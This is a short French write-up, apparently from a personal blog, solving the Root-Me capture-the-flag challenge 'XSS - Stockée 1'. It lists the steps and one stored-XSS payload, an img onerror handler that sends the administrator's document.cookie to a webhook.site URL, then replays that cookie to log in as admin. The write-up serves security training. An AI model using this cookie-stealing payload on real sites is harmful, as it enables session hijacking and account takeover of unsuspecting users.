---
title: 'XSS - Stockée 1'
description: "Exploitation d'une vulnérabilité XSS stockée pour voler des cookies"
pubDate: 'Jul 1 2025'
heroImage: '/src/assets/root_me/rootme10-0.png'
---

## 9. XSS - Stockée 1

**Objectif :** Voler le cookie de session de l'administrateur et l'utiliser pour valider l'épreuve  
**Méthode :** Injection XSS stockée avec exfiltration de cookies  
**Outils utilisés :** Webhook.site / Injection de code / JS  
**Temps :** 25 minutes  


### Solution

Exploitation d'une vulnérabilité XSS stockée pour voler les cookies d'un administrateur.

![Challenge JavaScript Native Code](/src/assets/root_me/rootme10-0.png)

**Étapes :**
1. Tester l'injection de code avec `alert('XSS')` dans le champ description
2. Confirmer que l'injection fonctionne
3. Créer un webhook sur webhook.site pour capturer les données
4. Injecter le payload XSS :
   ```html
   <img src="x" onerror="new Image().src='https://webhook.site/602ea2d1-dbf7-4c77-a784-8c8381fb7ae6?cookie='+document.cookie">
   ```
5. Attendre que l'administrateur visite la page
6. Récupérer le cookie sur le webhook
7. Utiliser le cookie pour s'authentifier comme administrateur

![Challenge JavaScript Native Code](/src/assets/root_me/rootme10-1.png)

![Challenge JavaScript Native Code](/src/assets/root_me/rootme10-2.png)
![Challenge JavaScript Native Code](/src/assets/root_me/rootme10-3.png)
![Challenge JavaScript Native Code](/src/assets/root_me/rootme10-5.png)
![Challenge JavaScript Native Code](/src/assets/root_me/rootme10-6.png)
![Challenge JavaScript Native Code](/src/assets/root_me/rootme10-4.png)
